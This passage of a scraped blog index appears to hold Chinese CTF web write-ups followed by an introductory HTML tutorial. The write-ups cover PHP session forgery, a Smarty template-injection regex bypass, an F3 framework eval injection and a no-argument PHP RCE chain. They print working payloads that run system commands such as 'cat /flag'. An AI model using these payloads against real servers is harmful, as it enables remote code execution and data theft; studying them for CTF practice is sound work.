if(readfile($file_path))&#123;            //使用readfile读取文件            $download_result = &quot;downloaded&quot;;        &#125;else&#123;            throw new RuntimeException(&#x27;error while saving&#x27;);        &#125;    &#125; catch (RuntimeException $e) &#123;        $download_result = $e-&gt;getMessage();    &#125;    exit;&#125;\n\n我们传入direction=download&amp;filename=sess_d392081dcf6f7879122c9e26845df018\n\n\n不同的引擎所对应的session的存储方式有\nphp_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值php:存储方式是，键名+竖线+经过serialize()函数序列处理的值php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n因此我们可以判断这里session处理器为php_binary，那么我们可以在本地利用php_binary生成我们要伪造的session文件。\n&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);session_save_path(&quot;D:\\\\phpstudy_pro\\\\WWW\\\\testphp\\\\&quot;);session_start();$_SESSION[&#x27;username&#x27;] = &#x27;admin&#x27;;\n\n于是我们已经可以成功伪造SESSION，剩下的就是将伪造的SESSION上传到服务器覆盖原来的session\n看见wp使用的是postman这个插件进行文件上传，但是我还没有，但是php也可以进行文件上传，但是实在太麻烦了，这么一看postman也就很好下载了\n我们利用上面生成的session文件，进行一个文件上传\n\n\n上传完成之后我们尝试去读取SESSION，但是我们还不知道储存的文件名\n$file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#x27;up_file&#x27;][&#x27;tmp_name&#x27;]);\n\nhash_file() 是 PHP 中用于计算文件内容哈希值的函数，它可以计算文件的加密哈希值（如 MD5、SHA1、SHA256 等）。\n根据这个代码，我们可以跑出文件名\n&lt;?php$file = &#x27;D:\\\\phpstudy_pro\\\\WWW\\\\testphp\\\\sess&#x27;;// 检查文件是否存在if (!file_exists($file)) &#123;    die(&quot;文件不存在: &quot; . $file);&#125;// 检查文件是否可读if (!is_readable($file)) &#123;    die(&quot;文件不可读: &quot; . $file);&#125;// 计算文件哈希$hash = hash_file(&#x27;sha256&#x27;, $file);if ($hash === false) &#123;    die(&quot;计算哈希失败&quot;);&#125;echo &quot;文件SHA256哈希值: &quot; . $hash;?&gt;//432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4\n\n所以我们上传文件名为sess也是有讲究的，是为了让文件名和文件哈希值拼接的时候刚好和SESSION默认储存的文件名格式一样，然后我们只要在cookie中将sessionid改为我们的哈希值就可以读取我们上传的SESSION文件\n我们知道储存文件名后，我们可以尝试读取文件看看我们传入direction=download&amp;attr=&amp;filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4\n\n\n看来是成功上传了\n马上就要成功了，我们直接在上传success.txt这个文件，但是在上传的时候文件名会被加密，正常来说我们很难去上传一个名字为success.txt的文件，我们可以利用file_exists()函数的漏洞\n\n\n文件名设置不了，直接创建目录也符合条件，将attr设置为success.txt创建目录，再将sess上传到该目录下即可绕过判断\n这就是attr的作用，不然加上一个这个参数没什么用\n为了代码运行不报错，我们尽量保持参数齐全，就算是为空\n\n\n我们这个时候应该在success.txt/sess_这个路径下生成了SESSION，我们在访问一下\n\n\n成功上传，我们接下来改session然后重新访问即可\n\n"},{"title":"[HMGCTF2022]Smarty_Calculator","url":"/2025/07/06/HMGCTF2022-Smarty-Calculator/","content":"[HMGCTF2022]Smarty_Calculator界面是一个计算输入框，典型的SSTI，但是无论输入什么都是我还没有登录。好在www.zip下有源码，我们下载下来\n在index.php中有\nfunction waf($data)&#123;  $pattern = &quot;php|\\&lt;|flag|\\?&quot;;  $vpattern = explode(&quot;|&quot;, $pattern);  foreach ($vpattern as $value) &#123;        if (preg_match(&quot;/$value/&quot;, $data)) &#123;\t\t  echo(&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Calculator don  not like U&lt;h5&gt;&lt;br&gt;&quot;);          die();        &#125;    &#125;    return $data;&#125;if(isset($_POST[&#x27;data&#x27;]))&#123;  if(isset($_COOKIE[&#x27;login&#x27;])) &#123;      $data = waf($_POST[&#x27;data&#x27;]);      echo &quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Only smarty people can use calculators:&lt;h5&gt;&lt;br&gt;&quot;;      $smarty-&gt;display(&quot;string:&quot; . $data);  &#125;else&#123;      echo &quot;&lt;script&gt;alert(\\&quot;你还没有登录\\&quot;)&lt;/script&gt;&quot;;  &#125;&#125;\n\n我们只需要在cookie中加入一个login即可，但是我实在没有办法找到display函数在哪个文件\n看了题解后发现这考的是一个smarty框架的漏洞(以前做SSTI的时候也遇到过smarty框架)，\n\n\n在Smarty.class.php中发现了Smarty的版本\n我们直接去CVE中查找漏洞发现\n\n\n也就是说我们可以通过传参进行代码执行。\n于是直接尝试，但是失败了，题解说对我们输入进行了正则过滤，解法就是通过下载源码然后用winmerge去对比源码和题目代码中哪里不同。\n发现sysplugins\\smarty_internal_compile_function.php有点不同，在正则过滤那块出题人进行了修改，如果正则匹配成功，就会进入trigger_template_error函数，会导致不回显\n\n\n我们来分析一下这个正则匹配的差异，在题目给出的源码中，将!去掉，表示匹配成功即error；然后a-zA-Z0-9_\\x80-\\xff这些包含了正常的大小写字母，数字，下划线以及不可显字符；而后面的(.*)+中，.匹配除了换行符以外的所有字符，*匹配0次或者多次，+匹配一次或者多次\n发现正则过滤为\nif (preg_match(&#x27;/[a-zA-Z0-9_\\x80-\\xff](.*)+$/&#x27;, $_name)) &#123;            $compiler-&gt;trigger_template_error(&quot;Function name contains invalid characters: &#123;$_name&#125;&quot;, null, true);        &#125;\n\n框架源代码是匹配到字母数字和非ascii码字符以外则进行函数执行(不知道为什么会写出这样奇怪的正则过滤)，然后题目代码则是我们必须要绕过正则匹配才能进行函数执行\n我们来看正则表达式/[a-zA-Z0-9_\\x80-\\xff](.*)+$/，这个进行的是一个整体匹配首先在开头匹配字母和数字和非ascii码字符，然后再在后面匹配一个除换行符以外的其他所有字符.*，这个漏洞就在于.无法匹配换行符，我们可以通过换行符打破.的匹配。\n但是我们还有一个需要注意的地方就是，按理来说是只需要一个换行符即可绕过但是实际上需要两个以上，这个和正则表达式中$用于匹配行尾有关\n$ 匹配字符串末尾：\n\n$ 在 默认模式 下可以匹配：\n字符串真正的结尾，或者\n换行符 \\n 之前的位置（即 \\n 也算 “行尾”）。\n\n\n\n也就是说当$进行行尾匹配的时候会吞掉一个换行然后正则表达式匹配换行前面的内容，于是我们需要在原来payload的基础上在name后面多加两个换行符\n\n\npaylaod\ndata=&#123;function+name=&#x27;rce()&#123;&#125;;system(&quot;ls /&quot;);function+%0A%0A%0A&#x27;&#125;&#123;/function&#125;\n\n\n\n我们发现flag在根目录下\n由于之前对flag有过滤，直接使用通配符进行绕过\ndata=&#123;function+name=&#x27;rce()&#123;&#125;;system(&quot;cat /fla*&quot;);function+%0A%0A%0A&#x27;&#125;&#123;/function&#125;\n\n\n\n\n\n这个题目还有一种解法，但好像是非预期那就算了吧\n"},{"title":"[HFCTF2021_Quals]Unsetme","url":"/2025/06/04/HFCTF2021-Quals-Unsetme/","content":"[HFCTF2021_Quals]Unsetme&lt;?php// Kickstart the framework$f3=require(&#x27;lib/base.php&#x27;);$f3-&gt;set(&#x27;DEBUG&#x27;,1);if ((float)PCRE_VERSION&lt;8.0)    trigger_error(&#x27;PCRE version is out of date&#x27;);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];unset($f3-&gt;$a);$f3-&gt;run(); \n\n题目直接给源码了，引入了一个框架，从名字猜测是f3框架，于是去网上搜索漏洞\n自己找不到源码，于是就从别人的wp中把一些需要关注的源码抄了下来\nfunction __unset($key) &#123;\t$this-&gt;offsetunset($key);&#125;function clear($key) &#123;\t// Normalize array literal\t$cache=Cache::instance();\t$parts=$this-&gt;cut($key);\tif ($key==&#x27;CACHE&#x27;)\t\t// Clear cache contents\t\t$cache-&gt;reset();\telseif (preg_match(&#x27;/^(GET|POST|COOKIE)\\b(.+)/&#x27;,$key,$expr)) &#123;\t\t$this-&gt;clear(&#x27;REQUEST&#x27;.$expr[2]);\t\tif ($expr[1]==&#x27;COOKIE&#x27;) &#123;\t\t\t$parts=$this-&gt;cut($key);\t\t\t$jar=$this-&gt;hive[&#x27;JAR&#x27;];\t\t\tunset($jar[&#x27;lifetime&#x27;]);\t\t\t$jar[&#x27;expire&#x27;]=0;\t\t\tif (version_compare(PHP_VERSION, &#x27;7.3.0&#x27;) &gt;= 0) &#123;\t\t\t\t$jar[&#x27;expires&#x27;]=$jar[&#x27;expire&#x27;];\t\t\t\tunset($jar[&#x27;expire&#x27;]);\t\t\t\tsetcookie($parts[1],NULL,$jar);\t\t\t&#125; else &#123;\t\t\t\tunset($jar[&#x27;samesite&#x27;]);\t\t\t\tcall_user_func_array(&#x27;setcookie&#x27;,\t\t\t\t\tarray_merge([$parts[1],NULL],$jar));\t\t\t&#125;\t\t\tunset($_COOKIE[$parts[1]]);\t\t&#125;\t&#125;\telseif ($parts[0]==&#x27;SESSION&#x27;) &#123;\t\tif (!headers_sent() &amp;&amp; session_status()!=PHP_SESSION_ACTIVE)\t\t\tsession_start();\t\tif (empty($parts[1])) &#123;\t\t\t// End session\t\t\tsession_unset();\t\t\tsession_destroy();\t\t\t$this-&gt;clear(&#x27;COOKIE.&#x27;.session_name());\t\t&#125;\t\t$this-&gt;sync(&#x27;SESSION&#x27;);\t&#125;\tif (!isset($parts[1]) &amp;&amp; array_key_exists($parts[0],$this-&gt;init))\t\t// Reset global to default value\t\t$this-&gt;hive[$parts[0]]=$this-&gt;init[$parts[0]];\telse &#123;\t\t$val=preg_replace(&#x27;/^(\\$hive)/&#x27;,&#x27;$this-&gt;hive&#x27;,\t\t\t$this-&gt;compile(&#x27;@hive.&#x27;.$key, FALSE));\t\teval(&#x27;unset(&#x27;.$val.&#x27;);&#x27;);//eval 仅仅是简单的拼接命令\t\tif ($parts[0]==&#x27;SESSION&#x27;) &#123;\t\t\tsession_commit();\t\t\tsession_start();\t\t&#125;\t\tif ($cache-&gt;exists($hash=$this-&gt;hash($key).&#x27;.var&#x27;))\t\t\t// Remove from cache\t\t\t$cache-&gt;clear($hash);\t&#125;&#125;\n\n这种不全的代码审计我实在写不来我也不知道是怎么触发那个函数的\n这里是执行RCE的地方，和3.7.1比没有修改\n我们已知使用unset()销毁并不能销毁的变量时会调用__unset()方法，这里会把我们传入的参数赋值到$key，经过过滤后执行eval，可以发现eval处只是简单的字符串拼接，用分号闭合后就可以在后面构造代码进行RCE了compile处最后返回的$str是@hive.xxxxx的形式\n主要看一下第二个正则/\\.([^.\\[\\]]+)|\\[((?:[^\\[\\]\\&#39;&quot;]*|(?R))*)\\]/\n这里匹配的是以.开始后面是字符串加[]的形式或[]包裹字符串的形式\n我们尝试闭合unset进行命令执行\n?a=a%0a);phpinfo(\n\n我在构造payload时，发现?a=a);phpinfo(不可以，但是?a=a%0a);phpinfo(可以，这是为什么？\n答：%0a是换行符\\n的url编码，如果不插入换行符，就是下面这种效果\nunset($f3-&gt;a);phpinfo();\n\n这会导致PHP解释器将整行的字符当作unset的参数处理，导致语法错误。如果插入换行符，变成这样：\nunset($f3-&gt;a);phpinfo();\n\n换行符将代码拆分成多个语句，PHP解释器就会判定换行前参数参数接受完毕，从而成功执行后续代码。\n于是我们直接闭合读取flag即可\n?a=a%0a);system(&quot;cat /flag&quot;\n"},{"title":"[HNCTF_2022_WEEK2]Canyource","url":"/2025/07/24/HNCTF-2022-WEEK2-Canyource/","content":"[HNCTF_2022_WEEK2]Canyource&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;code&#x27;])&amp;&amp;!preg_match(&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;code&#x27;]))&#123;if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;        eval($_GET[&#x27;code&#x27;]);&#125;else    die(&#x27;nonono&#x27;);&#125;else    echo(&#x27;please input code&#x27;);?&gt;\n\n虽然这似乎是一个新生赛的题目，但是我的确没写出来，主要还是在一两个地方有判断失误\n先是这个正则替换\nif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;        eval($_GET[&#x27;code&#x27;]);&#125;\n\n这个正则匹配就是匹配名字字符后面跟括号也就是var_dump()这样的函数，后米娜还跟了一个(?R)?表示(?R) 是 递归引用整个正则表达式本身，相当于重复匹配 [^\\W]+\\(...\\) 的结构，后面的?则代表0到多次，也就是可以函数嵌套也可以没有\n我以为经过preg_replace，我的code会被替换，但是实际上只会返回被替换的结果，不会对本身造成影响\n然后这个题目很明显的在提示我们使用无参rce，因为经过正则匹配后只剩下一个引号\n我先把payload放出来\n?code=eval(end(current(get_defined_vars())));&amp;cmd=system(&#x27;cat flag.php&#x27;);\n\n我们先使用var_dump配合get_defined_vars去获取到当前变量，发现我们的$_GET数组在第一位，于是我们直接使用current获取到\n\n\n于是我们再使用end即可获取到我们另外一个参数形成跳板了，但是我有个疑惑的就是，由于函数嵌套结束后必须以分号结尾，但是在payload中没有，问了DS说这是eval的代码补全机制，如果检查到没有;则会补上\n太高级的代码也不行啊，函数原理一点也不好看，太多意外了\n"},{"title":"HTML","url":"/2024/12/30/HTML/","content":"HTML笔记1.HTML简介\n\n\n&lt;!DOCTYPE html&gt; 声明为 HTML5 文档\n&lt;html&gt; 元素是 HTML 页面的根元素\n&lt;head&gt; 元素包含了文档的元（meta）数据，如 &lt;meta charset&#x3D;”utf-8”&gt; 定义网页编码格式为 utf-8。\n&lt;title&gt; 元素描述了文档的标题\n&lt;body&gt; 元素包含了可见的页面内容\n&lt;h1&gt; 元素定义一个大标题\n&lt;p&gt; 元素定义一个段落\n\n代码如下:\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;\n\n2.HTML基础1.HTML标题标题（Heading）是通过 &lt;h1&gt; - &lt;h6&gt; 标签进行定义的。&lt;h1&gt; 定义最大的标题。 &lt;h6&gt; 定义最小的标题。并且为块级元素，独占一行，如果对块级元素进行宽度的调整则有可能不独占一行；\n&lt;h1&gt;这是一个一级标题&lt;/h1&gt;&lt;br&gt;&lt;h6&gt;这是一个六级标题&lt;/h6&gt;\n\n效果图：\n\n\n2.HTML段落段落是通过 &lt;p&gt; 标签定义的。也属于块级元素；如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 &lt;br&gt; 标签：\n&lt;p&gt;这是一段文字&lt;/p&gt;&lt;p&gt;这个&lt;br&gt;段落&lt;br&gt;演示了分行的效果&lt;/p&gt;\n\n&lt;p&gt;...&lt;/p&gt; 一对&lt;p&gt;&lt;/p&gt;标签就是一个自然段，两对就是两个自然段会自动换行常用属性：\talign 对齐方式：\t\t\tleft 左对齐\t\t\tright 右对齐\t\t\tcenter 居中对齐\t\t\tjustify 两端对齐例如：&lt;p align=&quot;left&quot;&gt;&lt;/p&gt; 左对齐段落\n\n\n\n3.HTML链接HTML 链接（Anchor）是网页之间跳转的核心部分。\nHTML 使用链接与网络上的另一个文档相连。\nHTML中的链接是一种用于在不同网页之间导航的元素。\n链接通常用于将一个网页与另一个网页或资源（如文档、图像、音频文件等）相关联。\n链接允许用户在浏览网页时单击文本或图像来跳转到其他位置，从而实现网页之间的互联。\nHTML 链接 通过&lt;a&gt;标签创建，通常用于将用户从一个页面导航到另一个页面、从一个部分跳转到页面中的另一个部分、下载文件、打开电子邮件应用程序或执行 JavaScript 函数等。\n基本语法\n&lt;a href=&quot;URL&quot;&gt;链接文本&lt;/a&gt;\n\n实例\n&lt;a href=&quot;https://mei-debug.github.io&quot;&gt;mei的博客&lt;/a&gt;\n\nHTML链接还有很多属性后续补充\n4.HTML图像在 HTML 中，图像由&lt;img&gt; 标签定义。属于行内元素&lt;img&gt; 是空标签，意思是说，它只包含属性，并且没有闭合标签。定义图像的语法是：\n&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;\n\n实例：\n&lt;img src=&quot;D:\\picture\\404.jpg&quot; alt=&quot;404&quot;&gt;\n\n效果图：\n\n\nheight（高度） 与 width（宽度）属性用于设置图像的高度与宽度。\n属性值默认单位为像素:\n&lt;img src=&quot;pulpit.jpg&quot; alt=&quot;Pulpit rock&quot; width=&quot;304&quot; height=&quot;228&quot;&gt;\n\n更多属性后续补充\n5.HTML表格HTML 表格由 &lt;table&gt; 标签来定义。\nHTML 表格是一种用于展示结构化数据的标记语言元素。\n每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义），表格可以包含标题行（**&lt;th&gt;**）用于定义列的标题。\n\ntr：tr 是 table row 的缩写，表示表格的一行。\ntd：td 是 table data 的缩写，表示表格的数据单元格。\nth：th 是 table header的缩写，表示表格的表头单元格。\n\n实例：\n&lt;table style=&quot;text-align: center;&quot; border=&quot;1&quot;&gt;        &lt;thead&gt;          &lt;tr&gt;            &lt;th&gt;列标题1&lt;/th&gt;            &lt;th&gt;列标题2&lt;/th&gt;            &lt;th&gt;列标题3&lt;/th&gt;          &lt;/tr&gt;        &lt;/thead&gt;        &lt;tbody&gt;          &lt;tr&gt;            &lt;td&gt;行1，列1&lt;/td&gt;            &lt;td&gt;行1，列2&lt;/td&gt;            &lt;td&gt;行1，列3&lt;/td&gt;          &lt;/tr&gt;          &lt;tr&gt;            &lt;td&gt;行2，列1&lt;/td&gt;            &lt;td&gt;行2，列2&lt;/td&gt;            &lt;td&gt;行2，列3&lt;/td&gt;          &lt;/tr&gt;        &lt;/tbody&gt;      &lt;/table&gt;\n\n效果：\n\n\n&lt;thead&gt;用于定义表格的标题部分&lt;tbody&gt;用于定义表格的主体部分但我实际上感觉不加上面两个标签也没区别\n通过使用 &lt;th&gt; 元素定义列标题，可以使其在表格中以粗体显示，与普通单元格区分开来。即自动字体加粗与居中。\n更多内容后续补充\n6.HTML列表HTML无序列表\n无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。\n无序列表使用 &lt;ul&gt; 标签\n&lt;ul&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ul&gt;\n\n效果如下：\n\nCoffee\nMilk\n\nHTML有序列表\n有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于  标签。每个列表项始于 &lt;li&gt; 标签。\n列表项使用数字来标记。\n&lt;ol&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ol&gt;\n\n浏览器中显示如下：\n\nCoffee\nMilk\n\nHTML自定义列表自定义列表不仅仅是一列项目，而是项目及其注释的组合。\n自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。\n&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt;&lt;dt&gt;Milk&lt;/dt&gt;&lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt;\n\n浏览器显示如下：\n\nCoffee\n\nblack hot drink\n\n\nMilk\n\nwhite cold drink\n\n\n\n3.HTML区块HTML 可以通过 &lt;div&gt; 和 &lt;span&gt;将元素组合起来。个人认为&lt;div&gt;与&lt;span&gt;大的区别只有块级元素和内联元素现在只写下定义后面用到的时候回来补充具体用法\n1.HTML&lt;div&gt;元素HTML &lt;div&gt; 元素是块级元素，它可用于组合其他 HTML 元素的容器。\n 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。\n\n如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。\n2.HTML&lt;span&gt;元素HTML &lt;span&gt; 元素是内联元素，可用作文本的容器\n&lt;span&gt; 元素也没有特定的含义。\n当与 CSS 一同使用时，&lt;span&gt; 元素可用于为部分文本设置样式属性。如果不对  应用样式，那么  元素中的文本与其他文本不会任何视觉上的差异。\n 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。\n3.HTML布局大多数网站会把内容安排到多个列中（就像杂志或报纸那样）。\n大多数网站可以使用 &lt;div&gt; 或者 &lt;table&gt; 元素来创建多列。CSS 用于对元素进行定位，或者为页面创建背景以及色彩丰富的外观。\ndiv 元素是用于分组 HTML 元素的块级元素。实例代码：\n&lt;body&gt; &lt;div id=&quot;container&quot; style=&quot;width:500px&quot;&gt; &lt;div id=&quot;header&quot; style=&quot;background-color:#FFA500;&quot;&gt;&lt;h1 style=&quot;margin-bottom:0;&quot;&gt;主要的网页标题&lt;/h1&gt;&lt;/div&gt; &lt;div id=&quot;menu&quot; style=&quot;background-color:#FFD700;height:200px;width:100px;float:left;&quot;&gt;&lt;b&gt;菜单&lt;/b&gt;&lt;br&gt;HTML&lt;br&gt;CSS&lt;br&gt;JavaScript&lt;/div&gt; &lt;div id=&quot;content&quot; style=&quot;background-color:#EEEEEE;height:200px;width:400px;float:left;&quot;&gt;内容在这里&lt;/div&gt; &lt;div id=&quot;footer&quot; style=&quot;background-color:#FFA500;clear:both;text-align:center;&quot;&gt;版权 © runoob.com&lt;/div&gt; &lt;/div&gt; &lt;/body&gt;\n\n效果图：\n\n\n可以看到虽然div为块级元素，但在宽度被设置的情况下并没有独占一行。\n4.HTML表单1.HTML表单的输入HTML 表单用于收集用户的输入信息。\nHTML 表单表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。\nHTML 表单通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。\n实例代码：\n&lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;    &lt;!-- 文本输入框 --&gt;    &lt;label for=&quot;name&quot;&gt;用户名:&lt;/label&gt;    &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; required&gt;    &lt;br&gt;    &lt;!-- 密码输入框 --&gt;    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;    &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;    &lt;br&gt;    &lt;!-- 单选按钮 --&gt;    &lt;label&gt;性别:&lt;/label&gt;    &lt;input type=&quot;radio&quot; id=&quot;male&quot; name=&quot;gender&quot; value=&quot;male&quot; checked&gt;    &lt;label for=&quot;male&quot;&gt;男&lt;/label&gt;    &lt;input type=&quot;radio&quot; id=&quot;female&quot; name=&quot;gender&quot; value=&quot;female&quot;&gt;    &lt;label for=&quot;female&quot;&gt;女&lt;/label&gt;    &lt;br&gt;    &lt;!-- 复选框 --&gt;    &lt;input type=&quot;checkbox&quot; id=&quot;subscribe&quot; name=&quot;subscribe&quot; checked&gt;    &lt;label for=&quot;subscribe&quot;&gt;订阅推送信息&lt;/label&gt;    &lt;br&gt;    &lt;!-- 下拉列表 --&gt;    &lt;label for=&quot;country&quot;&gt;国家:&lt;/label&gt;    &lt;select id=&quot;country&quot; name=&quot;country&quot;&gt;        &lt;option value=&quot;cn&quot;&gt;CN&lt;/option&gt;        &lt;option value=&quot;usa&quot;&gt;USA&lt;/option&gt;        &lt;option value=&quot;uk&quot;&gt;UK&lt;/option&gt;    &lt;/select&gt;    &lt;br&gt;    &lt;!-- 提交按钮 --&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;\n\n效果图：\n\n\n2.HTML表单-输入元素多数情况下被用到的表单标签是输入标签 **&lt;input&gt;**。\n输入类型是由 type 属性定义。\n接下来我们介绍几种常用的输入类型。\n1.文本域文本域通过 &lt;input type&#x3D;”text”&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。\n2.密码字段密码字段通过标签 &lt;input type&#x3D;”password”&gt; 来定义密码字段输入会变成小圆点\n3.单选按钮&lt;input type&#x3D;”radio”&gt; 标签定义了表单的单选框选项:\n&lt;form action=&quot;&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女&lt;/form&gt;\n\n一组选项之间需保持name一致，为了后续数据传输，也为了选项之间互相匹配\n4.复选框&lt;input type&#x3D;”checkbox”&gt; 定义了复选框。\n复选框可以选取一个或多个选项：\n&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle[]&quot; value=&quot;Bike&quot;&gt;我喜欢自行车&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle[]&quot; value=&quot;Car&quot;&gt;我喜欢小汽车&lt;/form&gt;\n\n因为是复选框所以name必须为数组用于传输数据\n5.提交按钮&lt;input type&#x3D;”submit”&gt; 定义了提交按钮。\n当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 action 定义了服务端的文件名。\naction 属性会对接收到的用户输入数据进行相关的处理:\n&lt;form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;\n\n6.补充value属性的标签及Value的作用input 标签的 value 属性的作用是由 input 标签的 type 属性的值决定的当 type 的取值为 button、reset、submit 时， value 属性的值表示的是按钮上显示的文本\n当 type 的取值为 text、password、hidden 时，value 属性的值表示的是输入框中显示的初始值，此初始值可以更改，并且在提交表单时，value 属性的值会发送给服务器（既是初始值，也是提交给服务器的值）当 type 的取值为 checkbox、radio 时，value 属性的值表示的是提交给服务器的值\n当 type 的取值为 image 时，点击它提交表单后，会将用户的点击位置相对于图像左上角的 x  y 坐标提交给服务器\n3.POST与GETGET和POST之间的区别：1、数据传输方式：🌟\nGET：请求参数附加在URL之后，通过查询字符串（query string）的方式传递。这意味着参数会直接暴露在URL中，不适宜传输敏感信息。POST：请求参数放在请求体（request body）中，不会在URL中显示，因此更适合传输大量或敏感数据。2、数据大小限制：🛤️\nGET：由于数据附在URL上，受URL长度限制（通常不超过2048字符，不同浏览器和服务器可能有所不同），因此能传输的数据量较小。POST：理论上没有数据大小的限制，因为数据不在URL中，而是放在请求体里，适合传输大量数据。3、安全性：🎨\nGET：较低，因为参数直接暴露在URL中，容易被截取和修改，且会保存在浏览器历史记录和web服务器日志中。POST：相对较高，虽然不是绝对安全，但因为数据不在URL中展示，相比GET更不易被窥探和篡改。4、幂等性：📚\nGET：是幂等的，即多次请求具有相同的效果，不会对服务器资源产生副作用。适合用于获取信息的操作。POST：不是幂等的，多次请求可能会导致资源的多次创建或其他非预期的副作用。通常用于修改数据或提交表单。5、缓存与收藏书签：🎫\nGET：请求可以被浏览器缓存，用户可以收藏GET请求的URL作为书签。POST：通常不会被缓存，也不适合用作书签，因为POST请求包含的数据（请求体）不会被保存在书签中。6、使用场景：🐦\nGET：适用于获取资源、搜索过滤、分页显示等只读操作，不需要改变服务器状态。POST：用于提交数据、创建新资源、处理表单提交等可能改变服务器状态的操作。🌟注意：get请求不太安全，不适合用来传输一些敏感性的信息。\n在Web开发中，选择使用GET还是POST请求取决于您想要执行的操作性质和需求。下面是选择GET和POST的一些建议情景：\n使用GET的情况：信息检索：当您只是从服务器获取数据，不对服务器上的数据产生任何影响时，应使用GET。例如，查询产品列表、搜索结果、获取用户资料等。\n幂等操作：如果一个操作执行多次产生的效果和执行一次是相同的（即操作是幂等的），适合使用GET。用户刷新页面或重新发起请求时，不会造成意外后果。\n书签和分享：当您希望用户能够保存请求的链接作为书签或直接分享给他人时，使用GET，因为参数直接体现在URL中。\n数据量小：因为GET请求的参数直接附在URL后面，大多数浏览器和服务器对URL长度有限制（通常是2048个字符左右），所以当数据量不大时使用GET。\n非敏感信息：由于GET请求的参数在URL中可见，所以不应该用来传输敏感信息，如密码或个人信息。\n使用POST的情况：数据修改：当您需要在服务器上创建新的资源或更新现有资源时，应该使用POST。例如，提交表单、发表评论、上传文件等。\n大型数据传输：POST请求没有URL长度限制，可以在请求体中发送大量数据，适合传输大文件或复杂数据结构。\n敏感信息：由于POST请求的数据不在URL中显示，而是放在请求体里，相对更安全，适合传输敏感信息。\n非幂等操作：如果一个操作执行多次可能会有不同的结果，比如多次提交订单会创建多个订单，这时应使用POST。\n避免缓存：当您不希望浏览器缓存请求的结果，确保每次请求都从服务器获取最新数据时，使用POST，因为POST请求默认不被缓存。\n✨总结：GET 适用于简单、安全、幂等的读取操作，特别适合那些不希望用户看到参数或结果被缓存的场景。POST 用于更复杂的操作，特别是涉及数据的修改、创建或包含大量&#x2F;敏感数据的场景，它提供了更高的灵活性和安全性。————————————————\n                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。\n\n原文链接：https://blog.csdn.net/qq_53142365/article/details/139056630\n补充元素此栏主要针对与前文未详细说明并常用的元素进行补充。\n&lt;br&gt; 一个换行标签换一行\n\n水平线标签&lt;hr&gt;&lt;/hr&gt; 效果为在页面中添加一条水平线常用属性：\tcolor：设置水平线颜色；    width：设置水平线长度；    size：设置水平线高度；    align：设置水平线对齐方式(默认居中)，可取值 left 或 right。例如：&lt;hr color=&quot;red&quot;&gt;&lt;/hr&gt;红色水平线\n\n文本标签&lt;b&gt;...&lt;/b&gt;\t字体加粗 &lt;strong&gt;...&lt;/strong&gt;\t定义加重语气 